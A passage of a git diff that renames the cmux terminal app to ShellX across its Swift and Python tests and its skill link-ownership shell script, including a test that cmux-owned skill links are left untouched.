++            peer: CLIVersionSkew.Peer(app: "shellx", version: "0.64.0", build: nil, cliPath: nil),
+             original: "method_not_found: x\n\nReason:\n  y",
+             bundle: Self.sourceTextBundle
+         ))
+         #expect(text.hasSuffix("(method_not_found: x  Reason:   y)"))
+     }
+ 
+     @Test("The echoed original error is printable too")
+     func originalErrorIsSanitized() throws {
+         let text = try #require(CLIVersionSkew.message(
+             method: "workspace.create",
+             socketPath: "/tmp/cmux.sock",
+             cliVersion: "cmux 0.65.0 (108)",
+             cliShortVersion: "0.65.0",
+             cliPath: nil,
+-            peer: CLIVersionSkew.Peer(app: "cmux", version: "0.64.0", build: nil, cliPath: nil),
++            peer: CLIVersionSkew.Peer(app: "shellx", version: "0.64.0", build: nil, cliPath: nil),
+             original: "method_not_found: x\u{1B}[2J",
+             bundle: Self.sourceTextBundle
+         ))
+         #expect(!text.unicodeScalars.contains { $0 == "\u{1B}" })
+         #expect(text.hasSuffix("(method_not_found: x[2J)"))
+     }
+ }
+diff --git a/cmuxTests/OpenCodeHookRegressionTests.swift b/cmuxTests/OpenCodeHookRegressionTests.swift
+index d4ec62bfb3..a4d2c3aa54 100644
+--- a/cmuxTests/OpenCodeHookRegressionTests.swift
++++ b/cmuxTests/OpenCodeHookRegressionTests.swift
+@@ -60,29 +60,29 @@ final class OpenCodeHookRegressionTests: XCTestCase {
+             executablePath: cliPath,
+             arguments: ["hooks", "opencode", "install", "--yes"],
+             environment: environment,
+             timeout: 5
+         )
+         XCTAssertFalse(result.timedOut, result.stderr)
+         XCTAssertEqual(result.status, 0, result.stderr)
+ 
+         let configDir = xdgConfigHome.appendingPathComponent("opencode", isDirectory: true)
+         XCTAssertTrue(
+-            fileManager.fileExists(atPath: configDir.appendingPathComponent("plugins/cmux-session.js").path),
++            fileManager.fileExists(atPath: configDir.appendingPathComponent("plugins/shellx-session.js").path),
+             "OpenCode's lifecycle plugin must follow XDG_CONFIG_HOME"
+         )
+         XCTAssertTrue(
+-            fileManager.fileExists(atPath: configDir.appendingPathComponent("plugins/cmux-feed.js").path),
++            fileManager.fileExists(atPath: configDir.appendingPathComponent("plugins/shellx-feed.js").path),
+             "OpenCode's Feed bridge must follow XDG_CONFIG_HOME"
+         )
+         XCTAssertFalse(
+-            fileManager.fileExists(atPath: root.appendingPathComponent("home/.config/opencode/plugins/cmux-session.js").path),
++            fileManager.fileExists(atPath: root.appendingPathComponent("home/.config/opencode/plugins/shellx-session.js").path),
+             "OpenCode hooks must not be split across legacy and XDG config directories"
+         )
+     }
+ 
+     private struct ProcessRunResult {
+         let status: Int32
+         let stdout: String
+         let stderr: String
+         let timedOut: Bool
+     }
+@@ -137,71 +137,71 @@ final class OpenCodeHookRegressionTests: XCTestCase {
+     func testOpenCodeInstallHooksIsIdempotentForLegacySetupAlias() throws {
+         let cliPath = try bundledCLIPath()
+         let root = FileManager.default.temporaryDirectory.appendingPathComponent("cmux-opencode-hooks-\(UUID().uuidString)", isDirectory: true)
+         let configDir = root.appendingPathComponent("opencode", isDirectory: true)
+         let binDir = root.appendingPathComponent("bin", isDirectory: true)
+         try FileManager.default.createDirectory(at: configDir, withIntermediateDirectories: true)
+         defer { try? FileManager.default.removeItem(at: root) }
+         try FileManager.default.createDirectory(at: binDir, withIntermediateDirectories: true)
+ 
+         let configURL = configDir.appendingPathComponent("opencode.json", isDirectory: false)
+-        try #"{"plugin":["other-plugin","./plugins/cmux-session.js"]}"#.write(to: configURL, atomically: true, encoding: .utf8)
++        try #"{"plugin":["other-plugin","./plugins/shellx-session.js"]}"#.write(to: configURL, atomically: true, encoding: .utf8)
+         let fakeOpenCodeURL = binDir.appendingPathComponent("opencode", isDirectory: false)
+         try "#!/bin/sh\nexit 0\n".write(to: fakeOpenCodeURL, atomically: true, encoding: .utf8)
+         chmod(fakeOpenCodeURL.path, 0o755)
+ 
+         var environment = ProcessInfo.processInfo.environment
+         environment["OPENCODE_CONFIG_DIR"] = configDir.path
+         environment["PATH"] = "\(binDir.path):\(environment["PATH"] ?? "/usr/bin")"
+         environment["CMUX_CLI_SENTRY_DISABLED"] = "1"
+         let result = runProcess(executablePath: cliPath, arguments: ["hooks", "opencode", "install", "--yes"], environment: environment, timeout: 5)
+ 
+         XCTAssertFalse(result.timedOut, result.stderr)
+         XCTAssertEqual(result.status, 0, result.stderr)
+-        let pluginURL = configDir.appendingPathComponent("plugins", isDirectory: true).appendingPathComponent("cmux-session.js", isDirectory: false)
++        let pluginURL = configDir.appendingPathComponent("plugins", isDirectory: true).appendingPathComponent("shellx-session.js", isDirectory: false)
+         let pluginSource = try String(contentsOf: pluginURL, encoding: .utf8)
+-        XCTAssertTrue(pluginSource.contains("cmux-opencode-session-plugin-marker"))
++        XCTAssertTrue(pluginSource.contains("shellx-opencode-session-plugin-marker"))
+         XCTAssertTrue(pluginSource.contains("id: \"cmux.session\""))
+         XCTAssertFalse(pluginSource.contains("ctx.event.subscribe({ signal"))
+         XCTAssertTrue(pluginSource.contains("event.properties || event.data"))
+         XCTAssertTrue(pluginSource.contains("\"hooks\", \"enqueue\", \"opencode\""))
+         XCTAssertTrue(pluginSource.contains("CMUXTERM_CLI_RESPONSE_TIMEOUT_SEC: \"1\""))
+ 
+         let secondResult = runProcess(executablePath: cliPath, arguments: ["setup-hooks", "--agent", "opencode"], environment: environment, timeout: 5)
+         XCTAssertFalse(secondResult.timedOut, secondResult.stderr)
+         XCTAssertEqual(secondResult.status, 0, secondResult.stderr)
+         XCTAssertFalse(secondResult.stdout.contains("Will write OpenCode cmux plugin"), secondResult.stdout)
+         XCTAssertTrue(secondResult.stdout.contains("OpenCode hooks already up to date"), secondResult.stdout)
+-        let feedSource = try String(contentsOf: configDir.appendingPathComponent("plugins/cmux-feed.js"), encoding: .utf8)
+-        XCTAssertTrue(feedSource.contains("cmux-feed-plugin-marker"))
+-        XCTAssertTrue(feedSource.contains("id: \"cmux.feed\""))
++        let feedSource = try String(contentsOf: configDir.appendingPathComponent("plugins/shellx-feed.js"), encoding: .utf8)
++        XCTAssertTrue(feedSource.contains("shellx-feed-plugin-marker"))
++        XCTAssertTrue(feedSource.contains("id: \"shellx.feed\""))
+         XCTAssertFalse(feedSource.contains("ctx.event.subscribe({ signal"))
+-        let tuiDirectory = configDir.appendingPathComponent("plugins/cmux", isDirectory: true)
++        let tuiDirectory = configDir.appendingPathComponent("plugins/shellx", isDirectory: true)
+         let packageSource = try String(contentsOf: tuiDirectory.appendingPathComponent("package.json"), encoding: .utf8)
+         XCTAssertTrue(packageSource.contains("\"./tui\": \"./tui.js\""))
+-        XCTAssertTrue(FileManager.default.fileExists(atPath: tuiDirectory.appendingPathComponent(".cmux-owned").path))
++        XCTAssertTrue(FileManager.default.fileExists(atPath: tuiDirectory.appendingPathComponent(".shellx-owned").path))
+         let serverSource = try String(contentsOf: tuiDirectory.appendingPathComponent("index.js"), encoding: .utf8)
+         XCTAssertTrue(serverSource.contains("id: \"cmux.server\""))
+-        XCTAssertTrue(serverSource.contains("cmux-opencode-tui-plugin-server-marker"))
++        XCTAssertTrue(serverSource.contains("shellx-opencode-tui-plugin-server-marker"))
+         XCTAssertTrue(serverSource.contains("export const CMUXFeed"))
+         XCTAssertTrue(serverSource.contains("client.permission.reply"))
+         XCTAssertTrue(serverSource.contains("requestID: requestId"))
+         XCTAssertTrue(serverSource.contains("reply,"))
+         XCTAssertTrue(serverSource.contains("session.form.reply"))
+         let tuiSource = try String(contentsOf: tuiDirectory.appendingPathComponent("tui.js"), encoding: .utf8)
+         XCTAssertTrue(tuiSource.contains("data.listen"))
+         XCTAssertTrue(tuiSource.contains("sessionBelongsToTUI"))
+         XCTAssertTrue(tuiSource.contains("spawn"))
+ 
+         let json = try XCTUnwrap(JSONSerialization.jsonObject(with: try Data(contentsOf: configURL), options: []) as? [String: Any])
+         XCTAssertNil(json["plugins"])
+-        XCTAssertEqual(try XCTUnwrap(json["plugin"] as? [String]), ["other-plugin", "./plugins/cmux"])
++        XCTAssertEqual(try XCTUnwrap(json["plugin"] as? [String]), ["other-plugin", "./plugins/shellx"])
+     }
+ 
+     // Regression for https://github.com/manaflow-ai/cmux/issues/7140: opencode resolves
+     // `{file:...}` templates on the raw config text before JSON parsing, so a `\/` written by
+     // slash-escaping serialization turns `{file:./AGENTS.md}` into a bad file reference.
+     func testOpenCodeInstallPreservesFileReferencesWithoutSlashEscaping() throws {
+         let cliPath = try bundledCLIPath()
+         let root = FileManager.default.temporaryDirectory.appendingPathComponent("cmux-opencode-slash-\(UUID().uuidString)", isDirectory: true)
+         let configDir = root.appendingPathComponent("opencode", isDirectory: true)
+         let binDir = root.appendingPathComponent("bin", isDirectory: true)
+@@ -222,21 +222,21 @@ final class OpenCodeHookRegressionTests: XCTestCase {
+         environment["CMUX_CLI_SENTRY_DISABLED"] = "1"
+         let result = runProcess(executablePath: cliPath, arguments: ["hooks", "opencode", "install", "--yes"], environment: environment, timeout: 5)
+         XCTAssertFalse(result.timedOut, result.stderr)
+         XCTAssertEqual(result.status, 0, result.stderr)
+ 
+         // Check the raw bytes: a JSON parser would decode `\/` back to `/` and hide the bug.
+         let rawConfig = try String(contentsOf: configURL, encoding: .utf8)
+         XCTAssertFalse(rawConfig.contains("\\/"), rawConfig)
+         XCTAssertTrue(rawConfig.contains("{file:./AGENTS.md}"), rawConfig)
+         XCTAssertTrue(rawConfig.contains("https://opencode.ai/config.json"), rawConfig)
+-        XCTAssertTrue(rawConfig.contains("./plugins/cmux"), rawConfig)
++        XCTAssertTrue(rawConfig.contains("./plugins/shellx"), rawConfig)
+     }
+ 
+     func testLegacyHookAliasesAreHiddenFromHelp() throws {
+         let cliPath = try bundledCLIPath()
+         var environment = ProcessInfo.processInfo.environment
+         environment["CMUX_CLI_SENTRY_DISABLED"] = "1"
+ 
+         let result = runProcess(executablePath: cliPath, arguments: ["help"], environment: environment, timeout: 5)
+ 
+         XCTAssertFalse(result.timedOut, result.stderr)
+diff --git a/skills/cmux-cua/link-policy.sh b/skills/cmux-cua/link-policy.sh
+index 57fb18ef8b..e3a1e7db91 100644
+--- a/skills/cmux-cua/link-policy.sh
++++ b/skills/cmux-cua/link-policy.sh
+@@ -97,56 +97,57 @@ cmux_cua_skill_name_is() {
+     value="$(cmux_cua_skill_frontmatter_name "$file")" || return 1
+     value="${value#\"}"
+     value="${value%\"}"
+     value="${value#\'}"
+     value="${value%\'}"
+     [[ "$value" == "$expected" ]]
+ }
+ 
+ cmux_cua_skill_target_is_managed() {
+     # A resource suffix, app name, or dangling path alone is not ownership
+-    # proof. A link is managed only when its existing bundle has cmux's bundle
+-    # identifier, lives in a known cmux install/build root, and is owned by
++    # proof. A link is managed only when its existing bundle has ShellX's bundle
++    # identifier, lives in a known ShellX install/build root, and is owned by
+     # root or the current user. Removed bundles have no verifiable owner or
+-    # identity and are deliberately preserved for manual review.
++    # identity and are deliberately preserved for manual review. Links into a
++    # cmux bundle (com.cmuxterm.*) belong to cmux and are never touched.
+     local target="$1"
+     local resource_name
+     case "$target" in
+         */Contents/Resources/cmux-cua) resource_name=cmux-cua ;;
+         */Contents/Resources/cmux-computer-use) resource_name=cmux-computer-use ;;
+         */Contents/Resources/codex-cua) resource_name=codex-cua ;;
+         *) return 1 ;;
+     esac
+ 
+     local app_bundle="${target%/Contents/Resources/$resource_name}"
+     [[ "$app_bundle" == *.app ]] || return 1
+     local home="${HOME:-}"
+     local app_owner
+     app_owner="$(/usr/bin/stat -f '%u' "$app_bundle" 2>/dev/null || true)"
+     [[ "$app_owner" == "0" || "$app_owner" == "$(/usr/bin/id -u)" ]] || return 1
+ 
+     case "$app_bundle" in
+-        /Applications/cmux*.app|/Applications/Utilities/cmux*.app|\
+-        "$home/Applications"/cmux*.app|\
+-        "$home/Library/Developer/Xcode/DerivedData"/cmux-*/Build/Products/*/cmux*.app|\
+-        /tmp/cmux-*/Build/Products/*/cmux*.app)
++        /Applications/ShellX*.app|/Applications/Utilities/ShellX*.app|\
++        "$home/Applications"/ShellX*.app|\
++        "$home/Library/Developer/Xcode/DerivedData"/cmux-*/Build/Products/*/ShellX*.app|\
++        /tmp/shellx-*/Build/Products/*/ShellX*.app)
+             ;;
+         *)
+             return 1
+             ;;
+     esac
+ 
+     local info_plist="$app_bundle/Contents/Info.plist"
+     if [[ -f "$info_plist" && -x /usr/libexec/PlistBuddy ]]; then
+         local bundle_id
+         bundle_id="$(/usr/libexec/PlistBuddy -c 'Print :CFBundleIdentifier' "$info_plist" 2>/dev/null)" || return 1
+-        [[ "$bundle_id" == com.cmuxterm.* ]]
++        [[ "$bundle_id" == pro.shellx.desktop || "$bundle_id" == pro.shellx.desktop.* ]]
+         return $?
+     fi
+     return 1
+ }
+ 
+ cmux_cua_skill_link_is_managed() {
+     local link="$1"
+     [[ -L "$link" ]] || return 1
+     local target resolved
+     target="$(cmux_cua_skill_readlink "$link")" || return 1
+diff --git a/tests/claude_teams_test_utils.py b/tests/claude_teams_test_utils.py
+index 9054128a84..a33abcabad 100644
+--- a/tests/claude_teams_test_utils.py
++++ b/tests/claude_teams_test_utils.py
+@@ -240,17 +240,17 @@ def install_pi_extension(config_dir: Path, cli_path: str | None = None) -> Path:
+         text=True,
+         check=False,
+         env=env,
+         timeout=20,
+     )
+     if install.returncode != 0:
+         raise RuntimeError(
+             f"exit={install.returncode} stdout={install.stdout!r} stderr={install.stderr!r}"
+         )
+ 
+-    extension_path = config_dir / "extensions" / "cmux-session.ts"
++    extension_path = config_dir / "extensions" / "shellx-session.ts"
+     if not extension_path.exists():
+         raise RuntimeError(f"expected extension at {extension_path}")
+     override = os.environ.get("CMUX_TEST_PI_EXTENSION_OVERRIDE")
+     if override:
+         shutil.copyfile(override, extension_path)
+     return extension_path
+diff --git a/tests/test_amp_extension_install.py b/tests/test_amp_extension_install.py
+index c781ab9fd5..7134ddfe43 100644
+--- a/tests/test_amp_extension_install.py
++++ b/tests/test_amp_extension_install.py
+@@ -83,26 +83,26 @@ def main() -> int:
+             env=env,
+             timeout=35,
+         )
+         if install.returncode != 0:
+             print("FAIL: amp plugin install failed")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+ 
+-        extension_path = root / ".config" / "amp" / "plugins" / "cmux-session.ts"
++        extension_path = root / ".config" / "amp" / "plugins" / "shellx-session.ts"
+         if not extension_path.exists():
+             print(f"FAIL: expected plugin at {extension_path}")
+             return 1
+         extension_text = extension_path.read_text(encoding="utf-8")
+-        if "cmux-amp-session-extension-marker" not in extension_text:
++        if "shellx-amp-session-extension-marker" not in extension_text:
+             print(f"FAIL: expected cmux marker in {extension_path}")
+             return 1
+         installed_stat = extension_path.stat()
+         refresh = subprocess.run(
+             [cli_path, "hooks", "amp", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=env,
+             timeout=20,
+diff --git a/tests/test_campfire_extension_install.py b/tests/test_campfire_extension_install.py
+index 25a59450c5..855245a971 100644
+--- a/tests/test_campfire_extension_install.py
++++ b/tests/test_campfire_extension_install.py
+@@ -346,26 +346,26 @@ def main() -> int:
+             env=env,
+             timeout=20,
+         )
+         if install.returncode != 0:
+             print("FAIL: campfire extension install failed")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+ 
+-        extension_path = home / ".campfire" / "agent" / "extensions" / "cmux-campfire-session.ts"
++        extension_path = home / ".campfire" / "agent" / "extensions" / "shellx-campfire-session.ts"
+         if not extension_path.exists():
+             print(f"FAIL: expected extension at {extension_path}")
+             return 1
+         extension_text = extension_path.read_text(encoding="utf-8")
+-        if "cmux-campfire-session-extension-marker" not in extension_text:
++        if "shellx-campfire-session-extension-marker" not in extension_text:
+             print(f"FAIL: expected cmux marker in {extension_path}")
+             return 1
+ 
+         reinstall = subprocess.run(
+             [cli_path, "hooks", "campfire", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=env,
+             timeout=20,
+@@ -659,21 +659,21 @@ await new Promise((resolve) => setTimeout(resolve, 300));
+         override_env = env.copy()
+         override_env["CAMPFIRE_CODING_AGENT_DIR"] = str(agent_override)
+         override_install = subprocess.run(
+             [cli_path, "hooks", "campfire", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=override_env,
+             timeout=20,
+         )
+-        override_extension_path = agent_override / "extensions" / "cmux-campfire-session.ts"
++        override_extension_path = agent_override / "extensions" / "shellx-campfire-session.ts"
+         if override_install.returncode != 0 or not override_extension_path.exists():
+             print("FAIL: campfire extension install did not respect CAMPFIRE_CODING_AGENT_DIR")
+             print(f"exit={override_install.returncode}")
+             print(f"stdout={override_install.stdout.strip()}")
+             print(f"stderr={override_install.stderr.strip()}")
+             return 1
+         override_uninstall = subprocess.run(
+             [cli_path, "hooks", "campfire", "uninstall", "--yes"],
+             capture_output=True,
+             text=True,
+diff --git a/tests/test_claude_wrapper_computer_use_skill.py b/tests/test_claude_wrapper_computer_use_skill.py
+index 76aa4876f4..48816848c9 100644
+--- a/tests/test_claude_wrapper_computer_use_skill.py
++++ b/tests/test_claude_wrapper_computer_use_skill.py
+@@ -40,20 +40,21 @@ def expect(condition: bool, message: str, failures: list[str]) -> None:
+     if not condition:
+         failures.append(message)
+ 
+ 
+ def run_wrapper(
+     argv: list[str],
+     *,
+     disabled: bool = False,
+     preexisting_link_target: Path | None = None,
+     preexisting_valid_cmux_link: bool = False,
++    preexisting_cmux_owned_link: bool = False,
+     preexisting_directory: bool = False,
+     preexisting_legacy_link_target: Path | None = None,
+     project_skill_collision: bool = False,
+     install_global_skill: bool = False,
+     global_skill_opt_out: bool = False,
+     cwd_under_home_no_git: bool = False,
+     diagnostics: bool = False,
+ ) -> tuple[subprocess.CompletedProcess[str], Path, Path, list[str]]:
+     """Run the wrapper inside a sandboxed HOME and fake app bundle.
+ 
+@@ -147,30 +148,43 @@ if [ "$1" = "ping" ]; then
+ fi
+ exit 1
+ """,
+     )
+ 
+     destination = home / ".claude" / "skills" / "cmux-cua"
+     if preexisting_link_target is not None:
+         destination.parent.mkdir(parents=True, exist_ok=True)
+         destination.symlink_to(preexisting_link_target)
+     if preexisting_valid_cmux_link:
++        # A link into an older ShellX build: ShellX manages (retires/retargets) it.
+         destination.parent.mkdir(parents=True, exist_ok=True)
+-        old_skill = home / "Library" / "Developer" / "Xcode" / "DerivedData" / "cmux-fixture" / "Build" / "Products" / "Debug" / "cmux DEV old.app" / "Contents" / "Resources" / "cmux-cua"
++        old_skill = home / "Library" / "Developer" / "Xcode" / "DerivedData" / "cmux-fixture" / "Build" / "Products" / "Debug" / "ShellX DEV old.app" / "Contents" / "Resources" / "cmux-cua"
+         old_skill.mkdir(parents=True)
+         (old_skill / "SKILL.md").write_text(
+-            "---\nname: cmux-cua\ndescription: Old cmux skill.\n---\n\nOld bundle.\n",
++            "---\nname: cmux-cua\ndescription: Old ShellX skill.\n---\n\nOld bundle.\n",
+             encoding="utf-8",
+         )
+         with (old_skill.parents[1] / "Info.plist").open("wb") as stream:
+-            plistlib.dump({"CFBundleIdentifier": "com.cmuxterm.app.debug.fixture"}, stream)
++            plistlib.dump({"CFBundleIdentifier": "pro.shellx.desktop.debug.fixture"}, stream)
+         destination.symlink_to(old_skill)
++    if preexisting_cmux_owned_link:
++        # A link an installed cmux created into its own bundle: never ShellX's to touch.
++        destination.parent.mkdir(parents=True, exist_ok=True)
++        cmux_skill = home / "Applications" / "cmux.app" / "Contents" / "Resources" / "cmux-cua"
++        cmux_skill.mkdir(parents=True)
++        (cmux_skill / "SKILL.md").write_text(
++            "---\nname: cmux-cua\ndescription: cmux's skill.\n---\n\ncmux bundle.\n",
++            encoding="utf-8",
++        )
++        with (cmux_skill.parents[1] / "Info.plist").open("wb") as stream:
++            plistlib.dump({"CFBundleIdentifier": "com.cmuxterm.app"}, stream)
++        destination.symlink_to(cmux_skill)
+     if preexisting_directory:
+         destination.mkdir(parents=True, exist_ok=True)
+         (destination / "SKILL.md").write_text("user-owned\n", encoding="utf-8")
+     if preexisting_legacy_link_target is not None:
+         legacy = home / ".agents" / "skills" / "cmux-computer-use"
+         legacy.parent.mkdir(parents=True, exist_ok=True)
+         legacy.symlink_to(preexisting_legacy_link_target)
+ 
+     env = {
+         "HOME": str(home),
+@@ -367,20 +381,35 @@ def test_claude_home_ancestor_is_not_project_collision(
+         if opt_in:
+             expect(os.path.realpath(link) == os.path.realpath(bundled_skill),
+                    f"HOME ancestor must permit retargeting to this exact bundle: {link}", failures)
+         else:
+             expect("managed-link-retired" in result.stderr and str(link) in result.stderr,
+                    f"retired managed Claude link must be diagnosed, got {result.stderr!r}", failures)
+         expect(add_dir_arg(args) is None,
+                f"HOME ancestor must not add an automatic skill directory: {args}", failures)
+ 
+ 
++def test_claude_never_touches_a_cmux_owned_skill_link(failures: list[str]) -> None:
++    # cmux and ShellX can be installed side by side; cmux's own link survives every
++    # ShellX launch, whatever ShellX's opt-in says.
++    for opt_in in (False, True):
++        result, link, bundled_skill, _args = run_wrapper(
++            ["hello"], preexisting_cmux_owned_link=True, install_global_skill=opt_in,
++        )
++        expect(result.returncode == 0,
++               f"cmux-owned link (opt-in={opt_in}): wrapper exited {result.returncode}: {result.stderr}", failures)
++        expect(link.is_symlink() and os.readlink(link).endswith("/cmux.app/Contents/Resources/cmux-cua"),
++               f"cmux-owned link (opt-in={opt_in}) must survive a ShellX launch unchanged: {link}", failures)
++        expect("managed-link-retired" not in result.stderr,
++               f"cmux-owned link (opt-in={opt_in}) must not be retired: {result.stderr!r}", failures)
++
++
+ def test_claude_collision_keeps_project_skill_and_avoids_second_row(
+     failures: list[str],
+ ) -> None:
+     result, link, _, args = run_wrapper(
+         ["hello"],
+         project_skill_collision=True,
+         install_global_skill=True,
+         diagnostics=True,
+     )
+     expect(
+@@ -607,20 +636,21 @@ def test_strict_mcp_config_skips_all_computer_use_sideloading(failures: list[str
+ 
+ 
+ def main() -> int:
+     failures: list[str] = []
+     test_claude_preserves_unverified_dangling_link_by_default(failures)
+     test_claude_default_is_session_scoped_without_global_mutation(failures)
+     test_claude_preserves_unverified_dangling_link_without_global_install(failures)
+     test_claude_explicit_opt_in_preserves_unverified_dangling_link(failures)
+     test_claude_default_preserves_positional_prompt_without_skill_directory(failures)
+     test_claude_home_ancestor_is_not_project_collision(failures)
++    test_claude_never_touches_a_cmux_owned_skill_link(failures)
+     test_claude_collision_keeps_project_skill_and_avoids_second_row(failures)
+     test_claude_explicit_global_opt_in_remains_available(failures)
+     test_claude_preserves_unverified_legacy_computer_use_link(failures)
+     test_claude_leaves_user_owned_legacy_links_alone(failures)
+     test_claude_global_skill_can_be_disabled_explicitly(failures)
+     test_claude_leaves_user_owned_skill_links_alone(failures)
+     test_claude_leaves_user_owned_skill_directories_alone(failures)
+     test_disabled_computer_use_skips_skill_loading(failures)
+     test_strict_mcp_config_skips_all_computer_use_sideloading(failures)
+     if failures:
+diff --git a/tests/test_cli_omo_shadow_config_mirror.py b/tests/test_cli_omo_shadow_config_mirror.py
+index c51ea162a9..bf658c2078 100644
+--- a/tests/test_cli_omo_shadow_config_mirror.py
++++ b/tests/test_cli_omo_shadow_config_mirror.py
+@@ -110,23 +110,23 @@ def check_auto_discovered_entries_are_not_mirrored(cli_path: str, failures: list
+         run = run_omo(cli_path, root)
+         shadow = root / ".shellx" / "omo-config"
+ 
+         # OpenCode loads these from the user's real config dir already.
+         for relative in [
+             "agents", "commands", "modes", "tools", "skills", "plugin",
+             "plugins/notify.js", "package-lock.json",
+         ]:
+             if os.path.lexists(shadow / relative):
+                 failures.append(f"shadow {relative} exists, so OpenCode would load or write it a second time")
+-        if not (shadow / "plugins" / "cmux-session.js").exists():
++        if not (shadow / "plugins" / "shellx-session.js").exists():
+             failures.append(f"cmux session plugin missing from the shadow dir; exit={run.returncode} stderr={run.stderr.strip()}")
+-        if (user_dir / "plugins" / "cmux-session.js").exists():
++        if (user_dir / "plugins" / "shellx-session.js").exists():
+             failures.append("cmux wrote its session plugin into the user's plugins dir")
+ 
+ 
+ def check_removed_user_entries_do_not_leave_dangling_links(cli_path: str, failures: list[str]) -> None:
+     with tempfile.TemporaryDirectory(prefix="cmux-omo-prune-") as td:
+         root = Path(td)
+         user_dir = make_user_config(root)
+         (user_dir / "snippets").mkdir()
+         (user_dir / "snippets" / "intro.md").write_text("Hello.\n", encoding="utf-8")
+         # Installed packages are shared through a node_modules link that pruning must keep.
+@@ -134,21 +134,21 @@ def check_removed_user_entries_do_not_leave_dangling_links(cli_path: str, failur
+         run_omo(cli_path, root)
+         shadow = root / ".shellx" / "omo-config"
+ 
+         # The user removes a folder, then launches omo again.
+         (user_dir / "snippets" / "intro.md").unlink()
+         (user_dir / "snippets").rmdir()
+         run = run_omo(cli_path, root)
+ 
+         if os.path.lexists(shadow / "snippets"):
+             failures.append(f"shadow snippets still exists after the user removed it; exit={run.returncode}")
+-        if not (shadow / "plugins" / "cmux-session.js").exists():
++        if not (shadow / "plugins" / "shellx-session.js").exists():
+             failures.append("pruning removed the cmux session plugin")
+         if not (shadow / "prompts" / "chief.md").exists():
+             failures.append("pruning removed a link whose target still exists")
+         shadow_node_modules = shadow / "node_modules"
+         if not shadow_node_modules.is_symlink() or shadow_node_modules.resolve() != (user_dir / "node_modules").resolve():
+             failures.append("pruning dropped the shared node_modules link")
+ 
+ 
+ def main() -> int:
+     try:
+diff --git a/tests/test_codex_wrapper_computer_use_mcp.py b/tests/test_codex_wrapper_computer_use_mcp.py
+index 07948eaf87..325def1a57 100755
+--- a/tests/test_codex_wrapper_computer_use_mcp.py
++++ b/tests/test_codex_wrapper_computer_use_mcp.py
+@@ -696,33 +696,33 @@ exit 1
+                     old_skill = (
+                         sandbox_home
+                         / "Library"
+                         / "Developer"
+                         / "Xcode"
+                         / "DerivedData"
+                         / "cmux-fixture"
+                         / "Build"
+                         / "Products"
+                         / "Debug"
+-                        / "cmux DEV old.app"
++                        / "ShellX DEV old.app"
+                         / "Contents"
+                         / "Resources"
+                         / "cmux-cua"
+                     )
+                     old_skill.mkdir(parents=True)
+                     (old_skill / "SKILL.md").write_text(
+                         "---\nname: cmux-cua\ndescription: Old cmux skill.\n---\n\nOld bundle.\n",
+                         encoding="utf-8",
+                     )
+                     write_helper_info(
+                         old_skill.parents[1] / "Info.plist",
+-                        "com.cmuxterm.app.debug.fixture",
++                        "pro.shellx.desktop.debug.fixture",
+                     )
+                     destination.symlink_to(old_skill)
+                 else:
+                     destination.symlink_to(
+                         "/nonexistent/cmux NIGHTLY user-owned.app/Contents/Resources/cmux-cua"
+                     )
+             if preexisting_codex_home_cmux_link:
+                 old_root = codex_home / "skills"
+                 old_root.mkdir(parents=True, exist_ok=True)
+                 old_destination = old_root / "cmux-cua"
+diff --git a/tests/test_omp_extension_install.py b/tests/test_omp_extension_install.py
+index 67724a7632..821c4bb2b9 100755
+--- a/tests/test_omp_extension_install.py
++++ b/tests/test_omp_extension_install.py
+@@ -462,55 +462,55 @@ def main() -> int:
+     if "--restore-only" in sys.argv:
+         with tempfile.TemporaryDirectory(prefix="cmux-omp-restore-") as td:
+             verify_restore_rejects_legacy_downgrade(cli_path, Path(td).resolve())
+         return 0
+ 
+     with tempfile.TemporaryDirectory(prefix="cmux-omp-extension-") as td:
+         root = Path(td)
+         home = root / "home"
+         home.mkdir()
+         shared_agent_dir = root / "shared-agent-dir"
+-        shared_pi_extension = shared_agent_dir / "extensions" / "cmux-session.ts"
++        shared_pi_extension = shared_agent_dir / "extensions" / "shellx-session.ts"
+         shared_pi_extension.parent.mkdir(parents=True)
+-        shared_pi_extension.write_text("// cmux-pi-session-extension-marker v1\n", encoding="utf-8")
++        shared_pi_extension.write_text("// shellx-pi-session-extension-marker v1\n", encoding="utf-8")
+ 
+         env = os.environ.copy()
+         env["HOME"] = str(home)
+         # OMP treats PI_CODING_AGENT_DIR as the full agent directory override.
+         # Install the OMP extension there while proving it does not collide with
+-        # Pi's different cmux-session.ts filename in the same extensions folder.
++        # Pi's different shellx-session.ts filename in the same extensions folder.
+         env["PI_CODING_AGENT_DIR"] = str(shared_agent_dir)
+ 
+         install = subprocess.run(
+             [cli_path, "hooks", "omp", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=env,
+             timeout=20,
+         )
+         if install.returncode != 0:
+             print("FAIL: omp extension install failed")
+             print(f"exit={install.returncode}")
+             print(f"stdout={install.stdout.strip()}")
+             print(f"stderr={install.stderr.strip()}")
+             return 1
+ 
+-        extension_path = shared_agent_dir / "extensions" / "cmux-omp-session.ts"
++        extension_path = shared_agent_dir / "extensions" / "shellx-omp-session.ts"
+         if not extension_path.exists():
+             print(f"FAIL: expected extension at {extension_path}")
+             return 1
+         extension_text = extension_path.read_text(encoding="utf-8")
+-        if "cmux-omp-session-extension-marker" not in extension_text:
++        if "shellx-omp-session-extension-marker" not in extension_text:
+             print(f"FAIL: expected cmux marker in {extension_path}")
+             return 1
+-        if shared_pi_extension.read_text(encoding="utf-8") != "// cmux-pi-session-extension-marker v1\n":
++        if shared_pi_extension.read_text(encoding="utf-8") != "// shellx-pi-session-extension-marker v1\n":
+             print("FAIL: OMP install modified the Pi extension in PI_CODING_AGENT_DIR")
+             return 1
+ 
+         reinstall = subprocess.run(
+             [cli_path, "hooks", "omp", "install", "--yes"],
+             capture_output=True,
+             text=True,
+             check=False,
+             env=env,
+             timeout=20,
+@@ -980,21 +980,21 @@ for (const rawPid of hungPidLines.slice(-2)) {
+         config_env.pop("PI_CODING_AGENT_DIR", None)
+         config_env["PI_CONFIG_DIR"] = str(config_override)
+         config_install = subprocess.run(
+             [cli_path, "hooks", "omp", "install", "--yes"],
+             capture_output=True,
